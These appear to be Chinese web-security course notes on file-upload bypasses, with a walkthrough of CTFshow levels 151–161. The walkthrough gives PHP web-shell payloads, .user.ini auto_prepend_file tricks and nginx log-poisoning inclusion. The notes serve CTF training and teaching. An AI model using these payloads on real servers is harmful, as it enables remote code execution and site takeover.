# WEB攻防-通用漏洞&文件上传&js验证&mime&user.ini&语言特性

![day31](/Users/yangluchao/Documents/GitHub/security/image/day31.png)

```
#知识点：
1、文件上传-前端验证
2、文件上传-黑白名单
3、文件上传-user.ini妙用
4、文件上传-PHP语言特性

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门

```

演示案例：

------

-   CTFSHOW-文件上传-151到161关卡

    ```
    151 152-JS验证+MIME
    Content-Type: image/png
    
    153-JS验证+user.ini
    https://www.cnblogs.com/NineOne/p/14033391.html
    .user.ini：auto_prepend_file=test.png
    test.png：<?php eval($_POST[x]);?>
    
    154 155-JS验证+user.ini+短标签
    <? echo '123';?>                                             //前提是开启配置参数short_open_tags=on
    <?=(表达式)?>                                               //不需要开启参数设置
    <% echo '123';%>                                          //前提是开启配置参数asp_tags=on
    <script language=”php”>echo '1'; </script>   //不需要修改参数开关
    .user.ini：auto_prepend_file=test.png
    test.png：<?=eval($_POST[x]);?>
    
    156 JS验证+user.ini+短标签+过滤
    .user.ini：auto_prepend_file=test.png
    test.png：<?=eval($_POST{x});?>
    
    157 158 159 JS验证+user.ini+短标签+过滤
    使用反引号运算符的效果与函数 shell_exec()相同
    .user.ini：auto_prepend_file=test.png
    test.png：<?=system('tac ../fl*')?>
    test.png：<? echo `tac /var/www/html/f*`?>
    
    160 JS验证+user.ini+短标签+过滤
    包含默认日志，日志记录UA头，UA头写后门代码
    .user.ini：auto_prepend_file=test.png
    test.png：<?=include"/var/lo"."g/nginx/access.lo"."g"?>
    
    161 JS验证+user.ini+短标签+过滤+文件头
    文件头部检测是否为图片格式文件
    .user.ini：GIF89A auto_prepend_file=test.png
    test.png：GIF89A <?=include"/var/lo"."g/nginx/access.lo"."g"?>
    
    ```

    
